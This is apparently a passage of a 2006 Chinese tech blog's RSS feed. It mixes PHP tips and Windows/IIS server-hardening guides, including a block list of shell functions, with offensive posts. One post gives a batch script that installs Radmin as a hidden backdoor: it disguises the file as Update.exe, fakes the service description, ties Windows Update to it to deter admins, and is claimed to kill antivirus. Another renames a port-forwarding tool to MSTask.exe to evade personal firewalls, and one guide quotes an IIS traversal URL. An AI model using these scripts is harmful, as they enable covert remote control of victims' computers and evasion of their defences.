color=&amp;quot;#007700&amp;quot;&amp;gt;) &amp;lt; &amp;lt;/font&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#0000bb&amp;quot;&amp;gt;0&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;) ? &amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#dd0000&amp;quot;&amp;gt;&#39;离及格差&#39;&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;.-&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#0000bb&amp;quot;&amp;gt;$temp_res &amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;: &amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#dd0000&amp;quot;&amp;gt;&#39;超出及格&#39;&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;.&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#0000bb&amp;quot;&amp;gt;$temp_res&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;; echo &amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#dd0000&amp;quot;&amp;gt;&#39;此学生成绩为：&#39;&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;.&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#0000bb&amp;quot;&amp;gt;$test&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;.&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#dd0000&amp;quot;&amp;gt;&#39;分 --&#39;&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;.&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#0000bb&amp;quot;&amp;gt;$res&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;.&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#dd0000&amp;quot;&amp;gt;&#39;分&#39;&amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#007700&amp;quot;&amp;gt;; &amp;lt;/font&amp;gt;&amp;lt;font color=&amp;quot;#0000bb&amp;quot;&amp;gt;?&amp;gt; &amp;lt;/font&amp;gt;&amp;lt;/code&amp;gt; </description>
    </item>
    
    <item>
      <title>新的一年开始了，明天就到学校了！</title>
      <link>http://example.org/2006/02/26/e696b0e79a84e4b880e5b9b4e5bc80e5a78be4ba86efbc8ce6988ee5a4a9e5b0b1e588b0e5ada6e6a0a1e4ba86efbc81/</link>
      <pubDate>Sun, 26 Feb 2006 09:07:26 +0000</pubDate>
      
      <guid>http://example.org/2006/02/26/e696b0e79a84e4b880e5b9b4e5bc80e5a78be4ba86efbc8ce6988ee5a4a9e5b0b1e588b0e5ada6e6a0a1e4ba86efbc81/</guid>
      <description>早就开学了，今天才从家走，好玩呀，
也不知道那里什么样了
过两天还要去北京
希望有个好的开始！</description>
    </item>
    
    <item>
      <title>PHP的内码转换函数 mb_convert_encoding()</title>
      <link>http://example.org/2006/02/25/phpe79a84e58685e7a081e8bdace68da2e587bde695b0-mb_convert_encoding/</link>
      <pubDate>Sat, 25 Feb 2006 16:19:13 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/phpe79a84e58685e7a081e8bdace68da2e587bde695b0-mb_convert_encoding/</guid>
      <description>因为某程序要用输出UTF-8编码..但是原数据是GBK编码的
百度 找了很多有关内码转换的类..但是缺点很多.又不支持GBK TO UTF-8
不过一个一个找还是在PHP官方的FAQ找到了mb_convert_encoding() 该函数要在PHP4.0.6以上才有..听说有的 想关链接: http://cn.php.net/manual/zh/function.mb-convert-encoding.php
做一个GBK To UTF-8 &amp;lt; ?php header(&amp;ldquo;content-Type: text/html; charset=Utf-8&amp;rdquo;); echo mb_convert_encoding(&amp;ldquo;妳係我的友仔&amp;rdquo;, &amp;ldquo;UTF-8&amp;rdquo;, &amp;ldquo;GBK&amp;rdquo;); ?&amp;gt;
再来个GB2312 To Big5 &amp;lt; ?php header(&amp;ldquo;content-Type: text/html; charset=big5&amp;rdquo;); echo mb_convert_encoding(&amp;ldquo;你是我的朋友&amp;rdquo;, &amp;ldquo;big5&amp;rdquo;, &amp;ldquo;GB2312&amp;rdquo;); ?&amp;gt;</description>
    </item>
    
    <item>
      <title>PHP木马的攻击的防御之道</title>
      <link>http://example.org/2006/02/25/phpe69ca8e9a9ace79a84e694bbe587bbe79a84e998b2e5bea1e4b98be98193/</link>
      <pubDate>Sat, 25 Feb 2006 16:17:53 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/phpe69ca8e9a9ace79a84e694bbe587bbe79a84e998b2e5bea1e4b98be98193/</guid>
      <description>1.防止跳出web目录　首先修改httpd.conf,如果你只允许你的php脚本程序在web目录里操作，还可以修改httpd.conf文件限制php的操作路径。比如你的web目录是/usr/local/apache/htdocs，那么在httpd.conf里加上这么几行：　php_admin_value open_basedir /usr/local/apache /htdocs 这样，如果脚本要读取/usr/local/apache/htdocs以外的文件将不会被允许，如果错误显示打开的话会提示这样的错误：
Warning: open_basedir restriction in effect. File is in wrong directory in
/usr/local/apache/htdocs/open.php on line 4
等等。
2.防止php木马执行webshell
打开safe_mode,
在,php.ini中设置
disable_functions= passthru,exec,shell_exec,system　二者选一即可,也可都选</description>
    </item>
    
    <item>
      <title>WIN服务器PHP软件下载</title>
      <link>http://example.org/2006/02/25/wine69c8de58aa1e599a8phpe8bdafe4bbb6e4b88be8bdbd/</link>
      <pubDate>Sat, 25 Feb 2006 16:16:57 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/wine69c8de58aa1e599a8phpe8bdafe4bbb6e4b88be8bdbd/</guid>
      <description>phpMyAdmin for Windows V2.7.0 http://www.skycn.com/soft/10687.html
php-4.4.0 http://cn.php.net/get/php-4.4.0-Win32.zip/from/a/mirror
mysql-4.0.26-win32 http://download.discuz.net/mysql-4.0.26-win32.zip
ZendOptimizer-2.6.2-Windows-i386 http://www.mepoor.net/attachment/ZendOptimizer-2.6.2-Windows-i386.exe</description>
    </item>
    
    <item>
      <title>给win2003打开fso读写权限</title>
      <link>http://example.org/2006/02/25/e7bb99win2003e68993e5bc80fsoe8afbbe58699e69d83e99990/</link>
      <pubDate>Sat, 25 Feb 2006 16:16:09 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/e7bb99win2003e68993e5bc80fsoe8afbbe58699e69d83e99990/</guid>
      <description>默认的windows2003是没有打开fso读写权限的,我用的是企业版的win2003,打开fso权限直截运行regsvr32 scrrun.dll即可.然后重启你的机算机,一切ok.</description>
    </item>
    
    <item>
      <title>打造完美Radmin</title>
      <link>http://example.org/2006/02/25/e68993e980a0e5ae8ce7be8eradmin/</link>
      <pubDate>Sat, 25 Feb 2006 16:15:24 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/e68993e980a0e5ae8ce7be8eradmin/</guid>
      <description>大家好，关于如何打造出完美的Radmin服务端，网上有很多类似的修改后的程序，但有的服务名会暴露，有的会显示CMD窗口，我弥补了它们的缺点，综合了它们的优点，打造出了现在这个完美的Radmin服务端。
准备工具 Rock免杀工具； IcoSprite图标更改器； Killer15杀杀毒软件防火墙工具； SC.exe服务添加删除更改工具； AdmDll.dll、Raddrv.dll、R_server（这个不用说了吧，Radmin的服务端）。
程序特点 自解压形式，双击即可，自动解压到%systemroot%\system32\drivers\目录下，并能干掉卡巴斯基等杀毒软件。使用vbs嵌套bat来执行所有内容，不会跳出任何窗口。自建服务，并修改服务名、显示名、描述使其做到隐蔽。依存Windows Update服务，给试图关闭它带来困惑。做完一切后以只读，隐藏形式隐蔽Radmin服务端的三个程序，删除掉生成的一些REG、BAT、VBS文件，并能够突破Radmin外部连接进来时XP SP2防火墙的拦截。
制作过程 首先自己安装一下Radmin服务端，配置完密码，端口等信息后导出其在HKEY_LOCAL_MACHINE\SYSTEM\RAdmin的注册表文件，这里我另存为名Server.reg。然后要修改R_server.exe的图标并修改文件名为迷惑性文字如Update.exe，修改图标我用IcoSprite，觉得还不错。这样假如对方装有天网之类防火墙的话，可以骗过一些菜鸟，同意允许对外连接。 接下来我们制作核心部分，最关键的BAT，重要的我将简单解释： @echo off @sc stop r_server ‘假如已经被装过R_server服务，先用SC将它停掉。 @sc delete r_server ‘将已经装过R_server服务删除。 @regedit /s server.reg @SC create MPservice BinPath= &amp;ldquo;%systemroot%\system32\drivers\Update.exe /service&amp;rdquo; type= own type= interact start= auto DisplayName= &amp;ldquo;Media Player of Remote Control Driver Update&amp;rdquo; ‘这句是用SC建立一个服务，服务名为Mpservice，路径Binpath为&amp;quot;%systemroot%\system32\drivers\Update.exe /service&amp;quot;，类型type为 own 与interact交互，启动类型start为 自动，显示名DisplayName为&amp;quot;Media Player of Remote Control Driver Update&amp;quot;。 @sc description MPservice &amp;ldquo;为Windows Media Player提供加载进程及驱动程序、库提供基层更新安全补丁的服务。&amp;rdquo; ‘这句是将MPservice服务的描述改为“为Windows Media Player提供加载进程及驱动程序、库提供基层更新安全补丁的服务。” @sc config wuauserv depend= MPservice ‘配置MPservice使wuauserv服务依存此服务（wuauserv可以根据自己喜欢改成其它服务，这里的wuauserv是系统在Windows Update 网站的自动更新服务）。这里的目的是迷惑管理员，使其不敢轻易停止我们生成的Radmin服务。 @echo Windows Registry Editor Version 5.</description>
    </item>
    
    <item>
      <title>通杀国内防火墙</title>
      <link>http://example.org/2006/02/25/e9809ae69d80e59bbde58685e998b2e781abe5a299/</link>
      <pubDate>Sat, 25 Feb 2006 16:14:44 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/e9809ae69d80e59bbde58685e998b2e781abe5a299/</guid>
      <description>直以来都有一个梦想：偶要是能发现些漏洞或BUG什么的该多好啊！于是整天对着电脑瞎弄瞎研究，研究什么呢？研究如何突破防火墙（偶这里指的防火墙是软体型的个人防火墙，硬件的偶也没条件。）嘿嘿，你还别说，还真没白研究，还真给偶发现了大多数防火墙的通病。这个BUG能让我们欺骗防火墙来达到访外的目的，具体情况是怎么样的呢？请看下面的解说！ 首先，我要介绍一下Windows系统特性，当一个程序运行时，它不能删除，但却能够改名！而当系统里的被保护程序遭到删除或损坏或改名时系统就会及时调用备份文件给予还原！我再讲讲防火墙，大家都知道许多防火墙的“应用程序规则”里一般默认就会让IE浏览器（iexplore.exe）、Outlook Express（msimn.exe）、lsass.exe、spoolsv.exe、MSTask.exe、winlogon.exe、services.exe、svchost.exe通过，而大多的防火墙认为只要是与规则里的路径及文件名相同就Pass！以这样的检测方法来决定是否放行，但它却完全没考虑到如果是别的文件替换的呢？——就相当于古装片里的易容术，易容后就认不得了！这就给了我们机会，我们可以利用这个BUG来欺骗防火墙来达到访外的目的！ 小知识：其实现在大多木马采用的DLL插线程技术也就是利用了这个原理，它们首先隐蔽的开启一个认证放行的程序进程（如Iexplore.exe进程），接着把DLL型木马插入这个线程内，然后访外时就可轻松突破防火墙的限制了——因为防火墙是不会拦截已认证放行的程序的。 原理讲完了，我们现在讲讲该如何利用这个BUG了！这里我用虚拟机做实验，制造如下条件： 为了更符合现实，我给服务器安装了“天网防火墙”、Radmin（但由于防火墙指定了访问IP地址，所以没办法正常连接！），MSSQL SERVER、Serv-u。首先我们用常用的方法进行端口转发，看看防火墙有什么反应！ 第一步，启用AngelShell Ver 1.0里的Fport（用来进行端口转发的服务端，几乎可以转发任何端口），然后在本地用FportClient（用来进行端口转发的客户端）监听好！ 第二步，直接在CMDSHELL里运行“e:\www\fport.exe 4899 192.168.1.1 7788”，这时我们看到虚拟机里的“天网”对Fport马上进行了拦截。
看到了吧！由于Fport并不是认证放行的，防火墙马上就进行了拦截！OK，现在我们实行欺骗计划，看偶如何突破防火墙的！还是执行第一步，然后新建一个批处理，内容如下： ren MSTask.exe MSTask1.exe ren fport.exe MSTask.exe MSTask.exe 4899 192.168.1.1 7788 Del %0 命名为go.bat，接着用SqlRootKit把“Fport.exe”和go.bat 一起copy到目标机子的c:\winnt\system32\（也就是MSTask所在的目录）在SqlRootKit里执行go.bat（注意如果要改MSTask.exe的名的话就需要有管理员权限）。 当FportClient出现“已经接受到远程计算机的连接！”时，用Radmin客户端连接本机的4899端口。
我们已经成功突破限制（由于防火墙没有限制本地连接4899端口，我们用Fport转发了它的端口，登录时等于本地连接，因此我们能够成功连接），这样一来，我们本不能逃过防火墙的Fport便变成了一个有“插线程”技术的端口转发工具了！ 据我实验，国内的防火墙几乎无一例外的“拥有”这个BUG！虽然这个BUG不会带来什么大的危害，但总是给入侵者多了一个黑我们的机会！ WTF老大说独乐乐不如众乐乐，所以我还是公布出来了，一是可以让我们国内的防火墙有所改进，二是给网管们提个醒！由于小弟技术有限，难免会出现错误，欢迎各位指正批评。
N/P （NetPatch） 来 源： 《黑客防线》</description>
    </item>
    
    <item>
      <title>WIN2000服务器安全配置全攻略</title>
      <link>http://example.org/2006/02/25/win2000e69c8de58aa1e599a8e5ae89e585a8e9858de7bdaee585a8e694bbe795a5/</link>
      <pubDate>Sat, 25 Feb 2006 16:13:35 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/win2000e69c8de58aa1e599a8e5ae89e585a8e9858de7bdaee585a8e694bbe795a5/</guid>
      <description>WIN2000服务器安全配置全攻略：目前，WIN2000 SERVER是比较流行的服务器操作系统之一，但是要想安全的配置微软的这个操作系统，却不是一件容易的事。本文试图对win2000 SERVER的安全配置进行初步的探讨。
一、 定制自己的WIN2000 SERVER
1．版本的选择：WIN2000有各种语言的版本，对于我们来说，可以选择英文版或简体中文版，我强烈建议：在语言不成为障碍的情况下，请一定使用英文版。要知道，微软的产品是以Bug &amp;amp; Patch而著称的，中文版的Bug远远多于英文版，而补丁一般还会迟至少半个月（也就是说一般微软公布了漏洞后你的机子还会有半个月处于无保护状况）
2．组件的定制：win2000在默认情况下会安装一些常用的组件，但是正是这个默认安装是极度危险的（米特尼科说过，他可以进入任何一台默认安装的服务器，我虽然不敢这么说，不过如果你的主机是WIN2000 SERVER的默认安装，我可以告诉你，你死定了）你应该确切的知道你需要哪些服务，而且仅仅安装你确实需要的服务，根据安全原则，最少的服务+最小的权限=最大的安全。典型的WEB服务器需要的最小组件选择是：只安装IIS的Com Files，IIS Snap-In，WWW Server组件。如果你确实需要安装其他组件，请慎重，特别是：Indexing Service, FrontPage 2000 Server Extensions, Internet Service Manager (HTML)这几个危险服务。
3． 管理应用程序的选择
选择一个好的远程管理软件是非常重要的事，这不仅仅是安全方面的要求，也是应用方面的需要。Win2000的Terminal Service是基于RDP（远程桌面协议）的远程控制软件，他的速度快，操作方便，比较适合用来进行常规操作。但是，Terminal Service也有其不足之处，由于它使用的是虚拟桌面，再加上微软编程的不严谨，当你使用Terminal Service进行安装软件或重起服务器等与真实桌面交互的操作时，往往会出现哭笑不得的现象，例如：使用Terminal Service重起微软的认证服务器（Compaq, IBM等）可能会直接关机。所以，为了安全起见，我建议你再配备一个远程控制软件作为辅助，和Terminal Service互补，象PcAnyWhere就是一个不错的选择。
二、 正确安装WIN2000 SERVER
1．分区和逻辑盘的分配，有一些朋友为了省事，将硬盘仅仅分为一个逻辑盘，所有的软件都装在C驱上，这是很不好的，建议最少建立两个分区，一个系统分区，一个应用程序分区，这是因为，微软的IIS经常会有泄漏源码/溢出的漏洞，如果把系统和IIS放在同一个驱动器会导致系统文件的泄漏甚至入侵者远程获取ADMIN。推荐的安全配置是建立三个逻辑驱动器，第一个大于2G，用来装系统和重要的日志文件，第二个放IIS，第三个放FTP，这样无论IIS或FTP出了安全漏洞都不会直接影响到系统目录和系统文件。要知道，IIS和FTP是对外服务的，比较容易出问题。而把IIS和FTP分开主要是为了防止入侵者上传程序并从IIS中运行。（这个可能会导致程序开发人员和编辑的苦恼，管他呢，反正你是管理员J）
2．安装顺序的选择：不要觉得：顺序有什么重要？只要安装好了，怎么装都可以的。错！win2000在安装中有几个顺序是一定要注意的：
首先，何时接入网络：Win2000在安装时有一个漏洞，在你输入Administrator密码后，系统就建立了ADMIN$的共享，但是并没有用你刚刚输入的密码来保护它，这种情况一直持续到你再次启动后，在此期间，任何人都可以通过ADMIN$进入你的机器；同时，只要安装一完成，各种服务就会自动运行，而这时的服务器是满身漏洞，非常容易进入的，因此，在完全安装并配置好win2000 SERVER之前，一定不要把主机接入网络。
其次，补丁的安装：补丁的安装应该在所有应用程序安装完之后，因为补丁程序往往要替换/修改某些系统文件，如果先安装补丁再安装应用程序有可能导致补丁不能起到应有的效果，例如：IIS的HotFix就要求每次更改IIS的配置都需要安装（变不变态？）
三、 安全配置WIN2000 SERVER
即使正确的安装了WIN2000 SERVER，系统还是有很多的漏洞，还需要进一步进行细致地配置。
1．端口：端口是计算机和外部网络相连的逻辑接口，也是计算机的第一道屏障，端口配置正确与否直接影响到主机的安全，一般来说，仅打开你需要使用的端口会比较安全，配置的方法是在网卡属性-TCP/IP-高级-选项-TCP/IP筛选中启用TCP/IP筛选，不过对于win2000的端口过滤来说，有一个不好的特性：只能规定开哪些端口，不能规定关闭哪些端口，这样对于需要开大量端口的用户就比较痛苦。
2．IIS：IIS是微软的组件中漏洞最多的一个，平均两三个月就要出一个漏洞，而微软的IIS默认安装又实在不敢恭维，所以IIS的配置是我们的重点，现在大家跟着我一起来：
首先，把C盘那个什么Inetpub目录彻底删掉，在D盘建一个Inetpub（要是你不放心用默认目录名也可以改一个名字，但是自己要记得）在IIS管理器中将主目录指向D:\Inetpub；
其次，那个IIS安装时默认的什么scripts等虚拟目录一概删除（罪恶之源呀，忘http://www.target.com/scripts/..%c1%1c../winnt/system32/cmd.exe了？我们虽然已经把Inetpub从系统盘挪出来了，但是还是小心为上），如果你需要什么权限的目录可以自己慢慢建，需要什么权限开什么。（特别注意写权限和执行程序的权限，没有绝对的必要千万不要给）
第三，应用程序配置：在IIS管理器中删除必须之外的任何无用映射，必须指的是ASP, ASA和其他你确实需要用到的文件类型，例如你用到stml等（使用server side include），实际上90%的主机有了上面两个映射就够了，其余的映射几乎每个都有一个凄惨的故事：htw, htr, idq, ida……想知道这些故事？去查以前的漏洞列表吧。什么？找不到在哪里删？在IIS管理器中右击主机-&amp;gt;属性-&amp;gt;WWW服务编辑-&amp;gt;主目录配置-&amp;gt;应用程序映射，然后就开始一个个删吧（里面没有全选的，嘿嘿）。接着在刚刚那个窗口的应用程序调试书签内将脚本错误消息改为发送文本（除非你想ASP出错的时候用户知道你的程序/网络/数据库结构）错误文本写什么？随便你喜欢，自己看着办。点击确定退出时别忘了让虚拟站点继承你设定的属性。
为了对付日益增多的cgi漏洞扫描器，还有一个小技巧可以参考，在IIS中将HTTP404 Object Not Found出错页面通过URL重定向到一个定制HTM文件，可以让目前绝大多数CGI漏洞扫描器失灵。其实原因很简单，大多数CGI扫描器在编写时为了方便，都是通过查看返回页面的HTTP代码来判断漏洞是否存在的，例如，著名的IDQ漏洞一般都是通过取1.idq来检验，如果返回HTTP200，就认为是有这个漏洞，反之如果返回HTTP404就认为没有，如果你通过URL将HTTP404出错信息重定向到HTTP404.htm文件，那么所有的扫描无论存不存在漏洞都会返回HTTP200，90%的CGI扫描器会认为你什么漏洞都有，结果反而掩盖了你真正的漏洞，让入侵者茫然无处下手（武侠小说中常说全身漏洞反而无懈可击，难道说的就是这个境界？）不过从个人角度来说，我还是认为扎扎实实做好安全设置比这样的小技巧重要的多。
最后，为了保险起见，你可以使用IIS的备份功能，将刚刚的设定全部备份下来，这样就可以随时恢复IIS的安全配置。还有，如果你怕IIS负荷过高导致服务器满负荷死机，也可以在性能中打开CPU限制，例如将IIS的最大CPU使用率限制在70%。
3．账号安全：
Win2000的账号安全是另一个重点，首先，Win2000的默认安装允许任何用户通过空用户得到系统所有账号/共享列表，这个本来是为了方便局域网用户共享文件的，但是一个远程用户也可以得到你的用户列表并使用暴力法破解用户密码。很多朋友都知道可以通过更改注册表Local_Machine\System\CurrentControlSet\Control\LSA-RestrictAnonymous = 1来禁止139空连接，实际上win2000的本地安全策略（如果是域服务器就是在域服务器安全和域安全策略中）就有这样的选项RestrictAnonymous（匿名连接的额外限制），这个选项有三个值：
0：None. Rely on default permissions（无，取决于默认的权限）</description>
    </item>
    
    <item>
      <title>加固Wind2003平台的WEB服务器</title>
      <link>http://example.org/2006/02/25/e58aa0e59bbawind2003e5b9b3e58fb0e79a84webe69c8de58aa1e599a8/</link>
      <pubDate>Sat, 25 Feb 2006 16:12:03 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/e58aa0e59bbawind2003e5b9b3e58fb0e79a84webe69c8de58aa1e599a8/</guid>
      <description>基于Windows平台下IIS运行的网站总给人一种感觉就是脆弱。早期的IIS确实存在很多问题，不过我个人认为自从Windows Server 2003发布后，IIS6及Windows Server 2003新的安全特性、更加完善的管理功能和系统的稳定性都有很大的增强。虽然从Windows Server 2003上可以看到微软不准备再发展ASP，特别是不再对Access数据库的完好支持，但是面对它的那些优势迫使我不得不舍弃Windows 2000 Server。况且我也不需要运行太多的ASP+Access，因为我的程序都是PHP+MySQL(说实话我不喜欢微软的ASP和ASPNET)，而且我确实信赖Windows Server 2003!
服务器、网站，看到这些词大家都会想到什么，不只是性能更加关注的是它的安全问题。很多人都无法做到非常完美的安全加固，因为大部分的资料都来源互联网，而互联网的资料总不是那么详尽，毕竟每个服务器的应用环境及运行程序不同。
我从事互联网这个行业只有2年时间，其间遇到了很多问题，我所管理的服务器部分是开放式(PUBLIC)的，它是向互联网的用户敞开的，所以我所面临的问题就更加的多!安全性首当其要，其次是系统的稳定性，最后才是性能。要知道服务器上存在很多格式各样的应用程序，有些程序本身就有缺陷，轻者造成服务器当机，严重的会危及到服务器的整个数据安全。
举个例子，有一台运行着300多个网站的Windows 2000 Server，一段时间里它经常Down机，发现内存泄漏特别快，几分钟时间内存使用立刻飙升到900M甚至高达1.2G，这个时候通过远程是无法访问服务器了，但是服务器系统本身却还在运行着。这个问题着实让我头疼了很长一段时间，因为如果要排查故障就要从这些网站入手，而网站的数量阻碍了我的解决进度。后来通过Filemon监控文件读取来缩小排查范围，之后对可疑网站进行隔离，最终找到故障点并解决。要知道一段小小的代码就可以让运行IIS5的 Windows 2000 Server 挂掉!而在Windows Server 2003下，应用程序的级别低中高级变更为了程序池，这样我们就可以对一个池进行设置对内存和CPU进行保护。它的这一特性让我减轻了很多的工作量并且系统也稳定了很多。
另外严重的就是安全性的问题了，无论任何文章都有一个宗旨就是尽量在服务器少开放端口，并开放必要的服务，禁止安装与服务器无关的应用程序。在 Windows 2000 Server中，目录权限都是Everyone，很多服务都是以SYSTEM权限来运行的，如Serv-U FTP 这款出色的FTP服务器平台曾经害苦了不少人，它的溢出漏洞可以使入侵者轻松的获取系统完全控制权，如果做到呢?就是因为Serv-U FTP服务使用SYSTEM权限来运行，SYSTEM的权利比Administrator的权利可大的多，注册表SAM项它是可以直接访问和修改的，这样入侵者便利用这一特性轻松在注册表中克隆一个超级管理员账号并获取对系统的完全控制权限。
我的目标:加固WEB服务器系统，使之提高并完善其稳定性及安全性。
系统环境:Windows Server 2003 Enterprise Edition With Service Pack 1(以下简称W2k3SP1)，WEB平台为IIS6，FTP平台为Serv-U FTP Server
安装配置操作系统
安装操作系统，在安装前先要先去调整服务器的BIOS设置，关闭不需要的I/O，这样节省资源又可以避免一些硬件驱动问题。务必断开服务器与网络的连接，在系统没有完成安全配置前不要将它接入网络。在安装过程中如果网卡是PNP类型的，那么应当为其网络属性只配置允许使用TCP/IP协议，并关闭在 TCP/IP上的NETBIOS，为了提供更安全的保证，应该启用TCP/IP筛选，并不开放任何TCP端口。完成操作系统的安装后，首次启动 W2K3SP1，会弹出安全警告界面，主要是让你立刻在线升级系统更新补丁，并配置自动更新功能，这个人性化的功能是W2K3SP1所独有的，在没有关闭这个警告窗口前，系统是一个安全运行的状态，这时我们应当尽快完成系统的在线更新。
修改Administrator和Guest这两个账号的密码使其口令变的复杂，并通过组策略工具为这两个敏感账号更名。修改位置在组策略中Computer Configuration-Windows Settings-Security Setting-Local Policies-Security Options下，这样做可以避免入侵者马上发动对此账号的密码穷举攻击。
服务器通常都是通过远程进行管理的，所以我使用系统自带的组件 “远程桌面”来对系统进行远程管理。之所以选择它，因为它是系统自带的组件缺省安装只需要去启用它就可以使用，支持驱动器映射、剪切板映射等应用，并且只要客户端是WindowsXP PRO都会自带连接组件非常方便，最主要还有一点它是免费的。当然第三方优秀的软件也有如:PCAnyWhere，使用它可以解决Remote Desktop无法在本地环境模式下工作的缺点。为了防止入侵者轻易地发现此服务并使用穷举攻击手段，可以修改远程桌面的监听端口:
运行 Regedt32 并转到此项: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
注意:上面的注册表项是一个路径;它已换行以便于阅读。
2. 找到“PortNumber”子项，您会看到值 00000D3D，它是 3389 的十六进制表示形式。使用十六进制数值修改此端口号，并保存新值。
要更改终端服务器上某个特定连接的端口，请按照下列步骤操作: 运行 Regedt32 并转到此项:</description>
    </item>
    
    <item>
      <title>如何设置虚拟主机访问权限</title>
      <link>http://example.org/2006/02/25/e5a682e4bd95e8aebee7bdaee8999ae68b9fe4b8bbe69cbae8aebfe997aee69d83e99990/</link>
      <pubDate>Sat, 25 Feb 2006 16:09:20 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/e5a682e4bd95e8aebee7bdaee8999ae68b9fe4b8bbe69cbae8aebfe997aee69d83e99990/</guid>
      <description>经常听到用户这样问冷刀:拥有虚拟站点的主机，该如何才能设置好用户的访问权呢? 笔者考虑了许久之后，决定借以此文回复“一度抱怨”冷刀没给答案的同志们! 其实这个问题提的很好，关于用户权限的设置确实里面蕴藏的很大的学文。权限小与大，是直接决定主机是否安全的关键，请看下文为您“量身”定做虚拟站点权限的套装! 1.首先双击“我的电脑”图标，进入操作界面。然后右击“D盘符”图标，弹出快捷菜单，选择“属性”选项，并单击“安全”栏，在到下方名称处选择Everyone用户组，并且勾选读取运行、列出文件目录、读取这三个权限，其它权限如有选中，请将其去掉。 2.单击“高级”按扭，弹出访问控制窗体，在次选择Everyone用户组，去掉“重置所有子对象的权限”复选框选项(如图1)，然后单击“确定”按钮。回到属性安全栏并选择Everyone用户组，最后单击右上角 “删除”按扭，将其删除即可。
小提示:删除了EVERYONE用户组，含义是使普通用户不能越权，而且ASP还可以正常使用。为了安全起见，其它目录也按其相同操作即可。 3.右击桌面“我的电脑”图标，单击“管理”选项，弹出计算机管理窗体。展开左侧本地用户和组，选择下方“用户”标签，按右键弹出快捷菜单，单击“新建用户”按钮。输入:leilei，设置密码为永不过期(如图2)，再单击隶属于将其加入GUEST用户组。然后进入IIS设置虚拟站点，并设置站点目录为E:\网站资源\BBSXP 5.12 正式版 ]\bbsxp(如图3)，在单击目录安全性栏目“编辑”按扭，并勾选“匿名访问”复选框，设置用户名、密码与新建leilei用户相同，最后单击“确定”按钮即可。
小提示: LEILEI这名用户是笔者随意建立的普通用户，大家在这里不必拘束，可以随意建立自己喜欢的名字。将LEILEI用户加入GUEST组，代表远程LEILEI用户可以访问本机。 然后并在IIS虚拟站点中设置了LEILEI这名用户访问权限，为远程来宾。 总结:就这样非常轻松的解决，LEILEI用户设置权限的问题。以上我们又做了非常健全的越权限制， 就算黑客得到了此用户，也只是来宾用户，丝毫危机不到你的电脑、IIS虚拟站点的安全问题，相信足以排除提升权限的忧患了。</description>
    </item>
    
    <item>
      <title>Windows2003下Asp配置技巧</title>
      <link>http://example.org/2006/02/25/windows2003e4b88baspe9858de7bdaee68a80e5b7a7/</link>
      <pubDate>Sat, 25 Feb 2006 16:08:38 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/windows2003e4b88baspe9858de7bdaee68a80e5b7a7/</guid>
      <description>装了2003以后，默认支持.net架构，抛弃了asp，所以刚刚安装了IIS的时候，访问是会出错的，错误提示为 Error Code 16389 超出系统资源 这是没有手动配置asp环境的缘故。
在 IIS 6.0 中，默认设置是特别严格和安全的，这样可以最大限度地减少因以前太宽松的超时和限制而造成的攻击。比如说默认配置数据库属性实施的最大 ASP 张贴大小为 204,800 个字节，并将各个字段限制为 100 KB。在 IIS 6.0 之前的版本中，没有张贴限制。导致我们学校里面的应用系统往2003移植经常会出错。这几天走了几个学校发现了一些问题，现汇总解决方案如下。 一、启用Asp支持 Windows Server 2003 默认安装，是不安装 IIS 6 的，需要另外安装。安装完 IIS 6，还需要单独开启对于 ASP 的支持。
第一步，启用Asp，进入： 控制面板 - 管理工具 -IIS(Internet 服务器)- Web服务扩展 - Active Server Pages - 允许 控制面板 - 管理工具 -IIS(Internet 服务器)- Web服务扩展 - 在服务端的包含文件 - 允许 第二步,启用父路径支持。 IIS-网站－主目录－配置－选项－启用父路径 第三步，权限分配 IIS-网站－（具体站点）－（右键）权限－Users完全控制
二、解决windows2003最大只能上载200K的限制。 先在服务里关闭iis admin service服务，找到windows\system32\inesrv\下的metabase.xml,打开，找到ASPMaxRequestEntityAllowed 把他修改为需要的值，然后重启iis admin service服务 1、在web服务扩展 允许 active server pages和在服务器端的包含文件 2、修改各站点的属性 主目录－配置－选项－启用父路径 3、使之可以上传大于 200k的文件(修改成您要的大小就可以了，如在后面补两个0，就允许20m了) c:\WINDOWS\system32\inetsrv\MetaBase.</description>
    </item>
    
    <item>
      <title>Windows Server 2003 安全配置</title>
      <link>http://example.org/2006/02/25/windows-server-2003-e5ae89e585a8e9858de7bdae/</link>
      <pubDate>Sat, 25 Feb 2006 16:07:40 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/windows-server-2003-e5ae89e585a8e9858de7bdae/</guid>
